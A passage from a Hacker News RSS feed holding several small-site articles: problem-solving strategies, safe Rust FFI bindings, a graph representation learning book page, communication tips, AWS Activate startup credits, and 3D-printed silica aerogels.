<p>Example from mathematician Henri Poincaré: <em>“The incidents of the travel made me forget my mathematical work. Having reached Coutances, we entered an omnibus to go someplace or other. At the moment when I put my foot on the step, the idea came to me, without anything in my former thoughts seeming to have paved the way for it, that the transformations I had used to define the Fuchsian functions were identical with those of non-Euclidean geometry.”</em></p>



<p>10. <strong>Reexamining</strong> – write down all the assumptions you’ve been making about the problem or about what a solution should look like (yes – make an actual list). Then start challenging them one by one to see if they are actually needed or whether some may be unnecessary or mistaken.</p>



<p>Psychology Example: <em>“We were assuming in our lab experiments that when people get angry they have some underlying reason behind it, but there may be some anger that is better modeled as a chemical fluctuation that is only loosely related to what happens in the lab, such as when people are quick to anger because they are hungry.”</em></p>



<p>Math Example: <em>“I need to construct a function that has this strange property, and so far I’ve assumed that the function must be smooth, but if it doesn’t actually need to be then perhaps I can construct just such a function out of simple linear pieces that are glued together.”</em></p>



<p>11.<strong> Reframing</strong> – try to see the problem differently. For instance, by flipping the default, analyzing the inverse of the problem instead, thinking about how you would achieve the opposite of what you want, or shifting to an opposing perspective.</p>



<p>Startup Example: <em>“If we were building this company over again completely from scratch, what would we do differently in the design of our product, and can we pivot the product in that direction right now?”</em></p>



<p>Life Example: <em>“Should move to New York to take a job that pays $20,000 more per year? Well, if I already lived in New York, the decision to stay there rather than taking a $20,000 pay cut to move here would be an easy one. …</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spencergreenberg.com/2017/06/1514/">https://www.spencergreenberg.com/2017/06/1514/</a></em></p>]]>
            </description>
            <link>https://www.spencergreenberg.com/2017/06/1514/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24249449</guid>
            <pubDate>Sun, 23 Aug 2020 04:10:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The problem of safe FFI bindings in Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24249007">thread link</a>) | @Rusky
<br/>
August 22, 2020 | https://www.abubalay.com/blog/2020/08/22/safe-bindings-in-rust | <a href="https://web.archive.org/web/*/https://www.abubalay.com/blog/2020/08/22/safe-bindings-in-rust">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
					<header>
	
	<p>August 22, 2020</p>
</header>

<p>Google has published a document on <a href="https://www.chromium.org/Home/chromium-security/memory-safety/rust-and-c-interoperability">Rust and C++ interoperability</a> in the context of Chromium. It describes their criteria for the experience of calling C++ from Rust — minimal use of <code><span>unsafe</span></code>, no boilerplate beyond existing C++ declarations, and broad support for existing Chromium types.</p>

<p>The response to this document has included a lot of confusion and misinformation. Really, this is a continuation of a larger ongoing discussion of how to use <code><span>unsafe</span></code> properly. Rust FFI and <code><span>unsafe</span></code> are complicated and often subtle topics, so here I am going to attempt to summarize the issues and suggest how we might address them.</p>

<h3 id="what-is-unsafe-exactly">What is <code><span>unsafe</span></code>, exactly?</h3>

<p><a href="https://www.rust-lang.org/">Rust</a>’s core value proposition is to “guarantee memory-safety and thread-safety — enabling you to eliminate many classes of bugs at compile time,” without sacrificing the ability to target the same use cases as C++ (namely: performance-critical, embedded, and/or integrated with other languages).</p>

<p>This memory and thread-safety (henceforth just “safety”) is normally enforced automatically by the compiler. However, Rust includes several features that are <em>not</em> checked in this way, including raw pointers, global mutable state, untagged unions, and (notably) the ability to call functions written in other languages. These features can only be used within an <code><span>unsafe</span></code> block:</p>

<div><div><pre><code><span>// This function accepts a raw pointer, which may be null, misaligned, dangling, etc.</span>
<span>fn</span> <span>read</span><span>(</span><span>address</span><span>:</span> <span>*</span><span>const</span> <span>i32</span><span>)</span> <span>{</span>
    <span>// The compiler rejects this:</span>
    <span>let</span> <span>data</span> <span>=</span> <span>*</span><span>address</span><span>;</span>

    <span>// The compiler accepts this:</span>
    <span>unsafe</span> <span>{</span> <span>let</span> <span>data</span> <span>=</span> <span>*</span><span>address</span><span>;</span> <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Rust provides these operations with the intent that they will be used <em>only</em> as building blocks for safe APIs. In other words, while the compiler does not enforce them, there <em>are</em> a set of rules governing the safe use of these operations.</p>

<p>Thus, an <code><span>unsafe</span></code> block is more than a mere warning that “this program might crash or corrupt the heap.” It is a marker that the program author has checked that they are following those rules! This is why <code><span>unsafe</span></code> is not “viral,” and we can still have safe Rust programs even with <code><span>unsafe</span></code> in the standard library:</p>

<p><strong>The most important part of an <code><span>unsafe</span></code> block is the surrounding context that ensures its contents will never break those rules, no matter how it is used.</strong> (The question of <a href="https://www.ralfj.de/blog/2016/01/09/the-scope-of-unsafe.html">“how much context?”</a> is an interesting one. It’s a bit of a tangent to this post, but the answer is generally based on module privacy.)</p>

<h3 id="how-can-calling-c-ever-be-safe">How can calling C++ ever be safe?</h3>

<p>When a Rust program calls a foreign function (that is, one written in another language like C++), there are several ways things can go wrong, breaking Rust’s memory and thread-safety promise. We can split them into two failure modes, which the surrounding context will need to prevent:</p>

<ul>
  <li>
    <p>Each foreign function’s type signature must be declared in the calling Rust program, because the compiler doesn’t read any external formats like C++ header files.</p>

    <p>This means the signature may not match the actual function, in which case the compiler produces garbage, and the call will probably corrupt the stack or similar.</p>
  </li>
  <li>
    <p>Each foreign function must be called following certain rules (e.g. “only call this once,” “only call this from one thread at a time,” “don’t pass a null pointer,” “this array argument must have at least N elements”).</p>

    <p>This means arguments or program state may not be valid, in which case the foreign function itself will probably do something to violate memory or thread-safety.</p>
  </li>
</ul>

<p>Writing matching type signatures by hand can be quite mechanical, tedious, and error-prone. When those signatures are simple enough, tools like <a href="https://github.com/rust-lang/rust-bindgen"><code><span>bindgen</span></code></a> can instead automatically generate them from C or C++ headers. This eliminates a whole class of bugs!</p>

<p>However, C++ type signatures encode more information than <code><span>bindgen</span></code> understands, including <em>ownership</em> information — who is responsible for freeing the object, and when and how should they do so? The <a href="https://github.com/dtolnay/cxx/"><code><span>cxx</span></code></a> binding generator understands several standard C++ “vocabulary” types like <code><span>std</span><span>::</span><span>vector</span></code> and <code><span>std</span><span>::</span><span>unique_ptr</span></code>, expanding the class of bugs we can eliminate.</p>

<p>The caller of a foreign function may not need to worry about the first failure mode, if they can use a tool like <code><span>bindgen</span></code> or <code><span>cxx</span></code>, but the second failure mode is more fundamental. They must inspect the foreign function and its documentation, and then add static or dynamic checks that ensure safe Rust programs can’t violate that function’s safety rules.</p>

<p>At this point, <strong>we can be sure that the Rust program is safe by inspecting these three things:</strong></p>

<ul>
  <li>The foreign function: it must actually be safe to call when following the rules enforced on the Rust side.</li>
  <li>The Rust call site: it must actually enforce the rules required by the foreign function.</li>
  <li>The binding generator tool: it must correctly translate the foreign language’s type signatures to Rust.</li>
</ul>

<p>The whole <em>rest</em> of the Rust program no longer matters at all, because it’s already checked by the Rust compiler.</p>

<h3 id="so-whats-the-problem">So what’s the problem?</h3>

<p>After <code><span>cxx</span></code>’s announcement, it immediately received an issue titled <a href="https://github.com/dtolnay/cxx/issues/1">“Calling from Rust to C++ is not safe”</a>, which cut directly to the core of this discussion: <code><span>cxx</span></code> generates wrapper functions that make the <code><span>unsafe</span></code> foreign function calls for you, so a Rust program can call C++ without the literal text <code><span>unsafe</span></code> anywhere in its source code.</p>

<p>It’s important to approach this with the realization that this particular aspect of <code><span>cxx</span></code> was <em>not</em> a new development. From the start, the Rust ecosystem has relied on macros and build scripts that generate <code><span>unsafe</span></code> blocks. Some of these macros are always safe to use, containing the blocks’ entire “safety context,” while others expect their users to do some extra safety checking on their own.</p>

<p>When a Rust function requires its callers to do some extra safety checking, you can add the <code><span>unsafe</span></code> keyword to its declaration, which makes it into a new unsafe operation that can only be invoked from another <code><span>unsafe</span></code> block:</p>

<div><div><pre><code><span>// This function can only be called from an `unsafe` block:</span>
<span>unsafe</span> <span>fn</span> <span>read</span><span>(</span><span>address</span><span>:</span> <span>*</span><span>const</span> <span>i32</span><span>)</span> <span>{</span> <span>..</span> <span>}</span>

<span>fn</span> <span>caller</span><span>()</span> <span>{</span>
    <span>let</span> <span>x</span> <span>=</span> <span>5</span><span>;</span>

    <span>// This is only okay if `&amp;x` is valid for whatever `read` does with `address`:</span>
    <span>unsafe</span> <span>{</span> <span>read</span><span>(</span><span>&amp;</span><span>x</span><span>);</span> <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In a sense, <code><span>unsafe</span></code> functions like this are the <em>exact opposite</em> of <code><span>unsafe</span></code> blocks. An <code><span>unsafe</span></code> <em>block</em> says “I’ve ensured that these operations are always safe.” An <code><span>unsafe</span></code> <em>function</em> says “The caller is responsible for ensuring this operation is always safe.” Ideally, both should carry comments justifying their correctness — on blocks, pointing out the safety checks; on functions, describing the rules the caller must follow.</p>

<p>However, code generation happens before and outside of this whole system! There’s no way to mark a macro or build script as an <code><span>unsafe</span></code> operation. This is the real question here: <strong>Where do we put the comments justifying that generated, safe wrapper functions enforce the foreign functions’ safety rules, and how would an audit know to look for them?</strong></p>

<h3 id="what-are-our-options">What are our options?</h3>

<p>I begin with a couple of obligatory non-options:</p>

<blockquote>
  <p>Why don’t you want <code><span>unsafe</span></code> blocks at all your FFI call sites? Isn’t the whole point of Rust to be safe by default, and mark all the exceptions to make debugging easier?</p>
</blockquote>

<p>This is deeply unsatisfying, and flies in the face of Rust’s usual approach to language design: “eat your cake and have it too!” We should be able to isolate most FFI-related unsafety to the FFI layer. To quote Google’s first requirement: “[<code><span>unsafe</span></code>] should be restricted to patches of genuinely unsafe Rust code, and for C++ interoperability code where there’s shared ownership or other complexities.”</p>

<p>There’s also the inverse, though I see it as a straw man more than a real argument:</p>

<blockquote>
  <p>Our APIs are already pretty easy to use correctly, let’s just mark them safe and move on.</p>
</blockquote>

<p>This is also deeply unsatsifying. Even in C++, we should be aware of our APIs’ rules and the ways people might accidentally break them. Preventing those mistakes is the <em>true</em> point of Rust’s safety, so if you would rather debug recurring memory corruption than translate those rules to Rust, either the API needs improvement or Rust is failing.</p>

<p>A couple of more realistic options:</p>

<h4 id="hand-written-wrappers">Hand-written wrappers</h4>

<p>You might take the time-honored approach of a typical “idiomatic Rust FFI wrapper” crate: use a binding generator however you like, but don’t make its output public. Instead, hand-write the crate’s public API from scratch.</p>

<p>This often works well! Plenty of libraries are small enough, the <a href="https://doc.rust-lang.org/cargo/reference/build-scripts.html#-sys-packages"><code><span>-</span><span>sys</span></code> crate convention</a> lets people work around the idiomatic wrapper if necessary, and there is an obvious place to deal with extra rules from foreign code. However, this duplication of API design is not always scalable.</p>

<p>It may also be the case that the foreign API is not conducive to being safely wrapped. Here it may be better to leave the bindings as <code><span>unsafe</span></code>, and build a safe API at a higher, and more application-specific, level.</p>

<h4 id="at-last-generated-wrappers">At last, generated wrappers</h4>

<p>You might instead come up with a convention for “<code><span>unsafe</span></code> macros.” Put “unsafe” in their name, or require users to pass the <code><span>unsafe</span></code> at an appropriate position in the macro’s input. <a href="https://news.ycombinator.com/item?id=24244121">This is likely to show up in <code><span>cxx</span></code></a> at some point.</p>

<p>This way you can still “grep for <code><span>unsafe</span></code>” and find the binding generator invocation, like we wanted. It amounts to asserting that all the foreign functions you’re binding to have no extra safety rules, which (believe it or not) <em>is</em> sometimes the case.</p>

<p>You might further tweak the binding generator to let you mark individual wrappers as <code><span>unsafe</span></code>, as an opt-out for those cases “where,” as Google puts it, “there’s shared ownership or other complexities.”</p>

<p>Another approach comes from Microsoft, in the <a href="https://github.com/microsoft/winrt-rs"><code><span>winrt</span><span>-</span><span>rs</span></code></a> crate. WinRT defines a whole new type system, designed to be easy to “project” into various languages, including C#, Javascript, C++, and now Rust. It also defines a file format to describe APIs in this type system. So long as it fits into the WinRT type system, a library written in one language can be used from any …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.abubalay.com/blog/2020/08/22/safe-bindings-in-rust">https://www.abubalay.com/blog/2020/08/22/safe-bindings-in-rust</a></em></p>]]>
            </description>
            <link>https://www.abubalay.com/blog/2020/08/22/safe-bindings-in-rust</link>
            <guid isPermaLink="false">hacker-news-small-sites-24249007</guid>
            <pubDate>Sun, 23 Aug 2020 02:12:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Graph Representation Learning Book]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24248977">thread link</a>) | @Anon84
<br/>
August 22, 2020 | https://www.cs.mcgill.ca/~wlh/grl_book/ | <a href="https://web.archive.org/web/*/https://www.cs.mcgill.ca/~wlh/grl_book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>

<p>
The field of graph representation learning has grown at an incredible (and sometimes unwieldy) pace over the past seven years, transforming from a small subset of researchers working on a relatively niche topic to one of the fastest growing sub-areas of deep learning.
</p>
<p>
This book is my attempt to provide a brief but comprehensive introduction to graph representation learning, including methods for embedding graph data, graph neural networks, and deep generative models of graphs.
</p>


<h3> Access </h3>
<ul>
	<li> Download the pre-publication <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book.pdf">pdf</a>.</li>
	<li> Access the individual chapters below.</li>
	<li> Print and e-book editions  will be released by Morgan &amp; Claypool publishers in late 2020. </li>
</ul>


<h3 id="graph-representation-learning">Contents and Chapter Drafts</h3>
<ul>
  <li>Chapter 1: Introduction and Motivations <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_1-Intro.pdf">[Draft. Updated August 2020.]</a></li>
  <li>Chapter 2: Background and Traditional Approaches <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_2-Background.pdf">[Draft. Updated August 2020.]</a></li>

  <li>Part I: Node Embeddings
    <ul>
      <li>Chapter 3: Neighborhood Reconstruction Methods <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_3-Node_Embeddings.pdf">[Draft. Updated August 2020.]</a></li>
      <li>Chapter 4: Multi-Relational Data and Knowledge Graphs <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_4-Knowledge_Graphs.pdf">[Draft. Updated August 2020.]</a></li>
    </ul>
  </li>
  <li>Part II: Graph Neural Networks
    <ul>
      <li>Chapter 5: The Graph Neural Network Model <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_5-GNNs.pdf">[Draft. Updated August 2020.]</a></li>
      <li>Chapter 6: Graph Neural Networks in Practice <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_6-GNNs_in_Practice.pdf">[Draft. Updated August 2020.]</a></li>
      <li>Chapter 7: Theoretical Motivations <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_7-GNN_Theory.pdf">[Draft. Updated August 2020.]</a></li>
    </ul>
  </li>
  <li>Part III: Generative Graph Models
    <ul>
      <li>Chapter 8: Traditional Graph Generation Approaches <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_8-Traditional_Graph_Generation.pdf">[Draft. Updated August 2020.]</a></li>
      <li>Chapter 9: Deep Generative Models <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Chapter_9-Deep_Graph_Generation.pdf">[Draft. Updated August 2020.]</a></li>
    </ul>
  </li>
  <li>Bibliography <a href="https://www.cs.mcgill.ca/~wlh/grl_book/files/GRL_Book-Bibliography.pdf">[Draft. Updated August 2020.]</a></li>
</ul>

<h3> Copyrights and Citation </h3>

<p> This book is a pre-publication draft of a book that will be published by Morgan &amp; Claypool publishers in late 2020, and the publishers have generously agreed to allow the public hosting of the pre-publication draft. 
The book should be cited as follows:</p>
<blockquote>
William L. Hamilton. (2020). Graph Representation Learning. Morgan &amp; Claypool, <i> forthcoming </i>.
</blockquote>
<p> 
All copyrights held by the author and publishers extend to these pre-publication drafts.
</p>



 

<h3> Errata </h3>
<p>
Feedback, typo corrections, and comments are welcome and should be sent to wlh@cs.mcgill.ca with [GRL BOOK] in the subject line.</p>

      


    </section></div>]]>
            </description>
            <link>https://www.cs.mcgill.ca/~wlh/grl_book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24248977</guid>
            <pubDate>Sun, 23 Aug 2020 02:07:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Six Tools for Clearer Communication]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24248902">thread link</a>) | @AlexDReeve
<br/>
August 22, 2020 | https://reeve.blog/blog/five-tools-for-clearer-communication/ | <a href="https://web.archive.org/web/*/https://reeve.blog/blog/five-tools-for-clearer-communication/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main id="genesis-content"><article itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text">
<p>We live in a noisy world.</p>



<p>To cut through this noise and create clarity for those around us, we all need to communicate effectively every day. Our work doesn’t speak for itself; we need to collaborate, inspire, and build relationships. To do this, we need to be able to communicate clearly.</p>



<p>As a shy child and introverted adult, externalizing my perspective never came naturally to me. It still doesn’t. In high school, I had the dubious honor of being cast in the only non-speaking role in drama class. Despite this, today, I spend the majority of my day, every day, communicating with people. In some ways, my day job&nbsp;<em>is</em>&nbsp;communication.</p>



<p>Communication is a learned skill. I’m certainly no Obama, but over time, I’ve collected a set of tools that have helped me communicate more effectively.</p>



<h3>Contents</h3>



<ol><li><a href="#rule-of-three">Rule of Three</a></li><li><a href="#answer-explain-example">Answer, Explain, Example</a></li><li><a href="#structure-say-summarize">Structure, Say, Summarize</a></li><li><a href="#feelings-last">Feelings Last Longer Than Words</a></li><li><a href="#pause-context">Pause and Give Context</a></li><li><a href="#so-what">“So What” Is Your One Key Takeaway</a></li></ol>



<h3 id="rule-of-three">Rule of Three</h3>



<p>Three is a magic number in communication. From stories, like The Three Musketeers, Three Blind Mice, and Three Little Pigs, to colloquialisms like “blood, sweat, and tears,” <em>three</em> is everywhere. There’s even a Latin phrase, omne trium perfectum, or <em>everything that comes in threes is perfect</em>.</p>



<p>Why is this? Humans beings seek both patterns and simplicity. We’re pattern-recognition machines, always looking for signals among the noise. Simultaneously, we have limited working memory. We can’t remember a list of fifteen things or even a list of five. But we can remember three, which is the minimum number of objects needed to make a pattern. Three is concise, persuasive, and memorable.</p>



<p>When you say, “there are three reasons we should do this,” people pay attention. They know that three is easy to digest and remember. And you, the speaker, are forced to structure your argument succinctly and compellingly. When you put seven bullet-points in a document or slide, people’s eyes glaze over. When you put a concise list of three, they digest it. Within reason, in verbal or written communication, distill what you have to say down to three.</p>



<h3 id="answer-explain-example">Answer, Explain, Example</h3>



<p>I heard this from a former LinkedIn executive. The premise is simple but powerful. When answering a question, give the answer, then elaborate, then provide an example. That’s it.</p>



<p>By answering the question immediately, you’re getting to the point and giving the person who asked a concise answer. Then you’re supporting it with your rationale. Finally, you’re backing it up with a real example.</p>



<h3 id="structure-say-summarize">Structure, Say, Summarize</h3>



<p>“Structure, Say, Summarize” is a tool I use when communicating something nuanced. The basis is this: First, structure how you’re going to make the statement. Second, make the statement. Third, summarize your position and the “<a href="#so-what">so what</a>.”</p>



<ul><li>Structure: It’s a risk, but there are three reasons we should do this.</li><li>Say: The first reason is X, the second is Y, the third reason is Z.</li><li>Summarize: I know nothing is guaranteed. But, given these reasons, we’re missing an opportunity to grow by not doing this.</li></ul>



<p>This structure is akin to a Dale Carnegie quote: “Tell the audience what you’re going to say, say it; then tell them what you’ve said.”</p>



<p>Verbal communication is messy, and it’s difficult for people to follow spoken paragraphs. Even when you don’t have a tidy list of three, starting with “there are a few reasons,” making stating a few points, then summarizing your view is a powerful way to communicate more clearly.</p>



<p>But don’t use this all the time, or you’ll seem like a robot.</p>



<h3 id="feelings-last">Feelings Last Longer Than Words</h3>



<p>People will often forget what you said, but they’ll never forget how you made them feel. You might have made a logically sound argument, but if the recipient didn’t feel enthused, inspired, or understood, it probably won’t stick.</p>



<p>Feelings are why the world’s most iconic brands are so effective. We don’t remember every detail, every line of copy, or every number. But they make us feel a certain way, and feelings are sticky.</p>



<p>If you want to inspire action or lead a team, logic is important, but so is ensuring people are inspired when they walk away from an interaction. People won’t remember everything you said, but they’ll remember how you made them feel.</p>



<h3 id="pause-context">Pause and Give Context</h3>



<p>Never assume that everyone has the same context that you do. There’s a magical and straightforward sequence of words for this: “Let me give some context to make sure we’re on the same page.”</p>



<p>In any given conversation, everyone has a perspective formulated from a different set of inputs. The more closely aligned you can get these inputs, the more effective your communication will be. Shared context helps avoid “talking past each other” situations.</p>



<p>One of the tenets of effective communication is <em>over-communication</em>. Most people associate this with being annoying or spam. In my experience, that isn’t true. Over-communication is about never assuming that people have the same context that you do.</p>



<h3 id="so-what">“So What” Is Your One Key Takeaway</h3>



<p>For every piece of communication that you create, find the “so what.” Whether a presentation, document, or slide,&nbsp;if someone asked, “so what?”, what would you say? </p>



<p>Whatever the answer to that question is, make sure it comes across clearly. The answer to “so what?” usually involves articulates the implication for the audience.</p>



<p>An easily applicable tip here is to title your slides or headers with the “so what” for that particular slide or section. Hone in on the most important takeaway and the implication for the audience — why should they care?</p>

			</div></article></main></div></div></div>]]>
            </description>
            <link>https://reeve.blog/blog/five-tools-for-clearer-communication/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24248902</guid>
            <pubDate>Sun, 23 Aug 2020 01:53:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Activate and Our $4k Mistake]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24248625">thread link</a>) | @CoreSet
<br/>
August 22, 2020 | https://formcake.com/blog/aws-activate-and-our-four-thousand-dollar-mistake | <a href="https://web.archive.org/web/*/https://formcake.com/blog/aws-activate-and-our-four-thousand-dollar-mistake">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Recently we signed up for the <a href="https://aws.amazon.com/activate/">AWS Activate</a> program, which provides startups / small internet businesses like us with a variety of benefits - from AWS credits to free business-tier support.</p>
<p>We signed up for AWS Activate as part of our application to the Stripe Atlas program, which we're <a href="https://formcake.com/our-experience-with-stripe-atlas">big fans</a> of, but you don't need to be a part of Stripe Atlas to sign up for Activate.</p>
<p>When signing up for Activate though you <em>do</em> need to know you'll be faced with a question that can drastically shape the number of credits you ultimately receive.</p>
<h2 id="the-mistake">The Mistake</h2>
<p>When we first went through the process we very simply answered that question wrong. We encountered the following screen, outlining the different sign up paths for bootstrapped vs funded startups.</p>
<p><img src="https://formcake.com/images/aws-activate-screen.png" alt="AWS Activate bootstrapped vs funded startups"></p>
<p>When we first signed up, we did so as a bootstrapped startup: We're not accepting any funding, or even incorporating as a C Corp so we can have shares and an officer structure. We're incorporated as an LLC because we want to slowly build our way to profitability, so "bootstrapped" as a term seemed to described us.</p>
<p>We received $1,000 in AWS credits and were happy, but <a href="https://formcake.com/stripe-atlas-includes-five-thousand-credits-this-is-what-we-got">raised the issue with Stripe</a> that we were curious if there was a chance at getting the $5,000 that the Stripe copy seemed to suggest.</p>
<p>Stripe not only got back to us but fought for us to <a href="https://formcake.com/how-an-email-got-us-five-thousand-aws-credits">receive the full $5,000 in credits from AWS</a>.</p>
<p>But in their email it became clear what the issue was: <strong>We signed up under the wrong option</strong>.</p>
<p>Even though we're not accepting proper funding rounds, we are "sponsored" by Stripe in a sense through the Atlas program. That means we have an organization code/ID we can plug into the AWS Activate signup process signifying that we're a "funded" startup.</p>
<p>Doing so appears to net you a cool $5,000 in AWS credits.</p>
<p>Luckily we pestered Stripe to the point where we were able to receive not just the extra money ($5,000) but also keep the original, $1,000 amount. Since we're a small startup that's on an all-AWS infrastructure, this money was pretty critical to us, and provides a nice runway.</p>
<h2 id="the-takeaway">The Takeaway</h2>
<p>If you're signing up for the AWS Activate program, consider looking for a program like Stripe Atlas to sign up with. If you're able to find this kind of sponsorship and sign up with your corresponding organization ID, you can probably expect more credits. Don't be like us and potentially leave this much money (well, credits) on the table.</p>
<p>If you're anything like us, that difference between $1,000 and $5,000 is something you can feel!</p>
</div></div>]]>
            </description>
            <link>https://formcake.com/blog/aws-activate-and-our-four-thousand-dollar-mistake</link>
            <guid isPermaLink="false">hacker-news-small-sites-24248625</guid>
            <pubDate>Sun, 23 Aug 2020 00:55:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Aerogel Meets 3D Printing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24248422">thread link</a>) | @finphil
<br/>
August 22, 2020 | https://nuadox.com/post/627194082848079872/aerogel-meets-3d-printing | <a href="https://web.archive.org/web/*/https://nuadox.com/post/627194082848079872/aerogel-meets-3d-printing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="627194082848079872">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/627194082848079872/aerogel-meets-3d-printing"><h2>Aerogel meets 3D printing</h2></a>
                                <figure data-orig-height="959" data-orig-width="1440"><img src="https://64.media.tumblr.com/2ffcb9cceea93831b3ac05d17694c444/f0f5e28fb89612e1-76/s1280x1920/963ab209a4c7da671d419e7b696b8eb8b7a5d199.jpg" data-orig-height="959" data-orig-width="1440" width="1280" height="852" alt="image"></figure><p><b>- By&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.empa.ch%2Fweb%2Fempa%2Fpersondisplay%3FuserDisplayName%3Dklr%26inheritRedirect%3Dtrue%26userNotPublicMsg%3Dtrue&amp;t=NzVjMmY2Y2IyZGM5OTNkMzdiYmI5NGQ0OGZhNzFkN2ZhZDAzOGU0YyxKSmhON0xtRw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627194082848079872%2Faerogel-meets-3d-printing&amp;m=0&amp;ts=1598358416">Rainer Klose</a> ,&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.empa.ch%2Fweb%2Fempa%2F&amp;t=MzZmMzgyYjgxYTIxZmQ5MDU1NzVlNjExNjE1MGU5NTlkYjBlMmIyNyxIUVZtY2Z2ag%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F621294078571708416%2Fsmallest-motor&amp;m=0&amp;ts=1598138140">Swiss Federal Laboratories for Materials Science and Technology (Empa)</a> -</b></p><p>Behind the simple headline “Additive manufacturing of silica aerogels” - the article was published on July 20th in the renowned scientific journal <i><a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fdx.doi.org%2F10.1038%2Fs41586-020-2594-0&amp;t=M2YwYTAwZDAwNGI0YjhhMjIyZTcyZTQxNjY1NzU0MWM4MzcyMzQ2ZSxKSmhON0xtRw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627194082848079872%2Faerogel-meets-3d-printing&amp;m=0&amp;ts=1598358416">Nature</a></i> - a groundbreaking development is hidden. Silica aerogels are light, porous foams that provide excellent thermal insulation.&nbsp;</p><p>In practice, they are also known for their brittle behaviour, which is why they are usually reinforced with fibres or with organic or biopolymers for large-scale applications. Due to their brittle fracture behaviour, it is also not possible to saw or mill small pieces out of a larger aerogel block. Directly solidifying the gel in miniaturised moulds is also not reliably - which results in high scrap rates. This is why aerogels have hardly been usable for small-scale applications.</p><h2><b>Stable, well-formed microstructures</b></h2><p>The Empa team led by Shanyu Zhao, Gilberto Siqueira, Wim Malfait and Matthias Koebel have now succeeded in producing stable, well-shaped microstructures from silica aerogel by using a 3D printer. The printed structures can be as thin as a tenth of a millimeter. The thermal conductivity of the silica aerogel is just under 16 mW/(m*K) - only half that of polystyrene and even significantly less than that of a non-moving layer of air, 26 mW/(m*K). At the same time, the novel printed silica aerogel has even better mechanical properties and can even be drilled and milled. This opens up completely new possibilities for the post-processing of 3D printed aerogel mouldings.</p><p>With the method, for which a patent application has now been filed, it is possible to precisely adjust the flow and solidification properties of the silica ink from which the aerogel is later produced, so that both self-supporting structures and wafer-thin membranes can be printed. As an example of overhanging structures, the researchers printed leaves and blossoms of a lotus flower. The test object floats on the water surface due to the hydrophobic properties and low density of the silica aerogel - just like its natural model. The new technology also makes it possible for the first time to print complex 3D multi-material microstructures.</p><h2><b>Insulation materials for microtechnology and medicine</b></h2><p>With such structures it is now comparatively trivial to thermally insulate even the smallest electronic components from each other. The researchers were able to demonstrate the thermal shielding of a temperature-sensitive component and the thermal management of a local “hot spot” in an impressive way. Another possible application is the shielding of heat sources inside medical implants, which should not exceed a surface temperature of 37 degrees in order to protect body tissue.</p><h2><b>A functional aerogel membrane</b></h2><p>3D printing allows multilayer/multi-material combinations to be produced much more reliably and reproducibly. Novel aerogel fine structures become feasible and open up new technical solutions, as a second application example shows: Using a printed aerogel membrane, the researchers constructed a “thermos-molecular” gas pump. This permeation pump manages without any moving parts at all and is also known to the technical community as a Knudsen pump, named after the Danish physicist Martin Knudsen. The principle of operation is based on the restricted gas transport in a network of nanoscale pores or one-dimensional channels of which the walls are hot at one end and cold at the other. The team built such a pump from aerogel, which was doped on one side with black manganese oxide nanoparticles. When this pump is placed under a light source, it becomes warm on the dark side and starts to pump gases or solvent vapours.</p><h2><b>Air purification without moving parts</b></h2><p>These applications show the possibilities of 3D printing in an impressive way: 3D printing turns the high-performance material aerogel into a construction material for functional membranes that can be quickly modified to suit a wide range of applications. The Knudsen pump, which is driven solely by sunlight, can do more than just pump: If the air is contaminated with a pollutant or an environmental toxin such as the solvent toluene, the air can circulate through the membrane several times and the pollutant is chemically broken down by a reaction catalyzed by the manganese oxide nanoparticles. Such 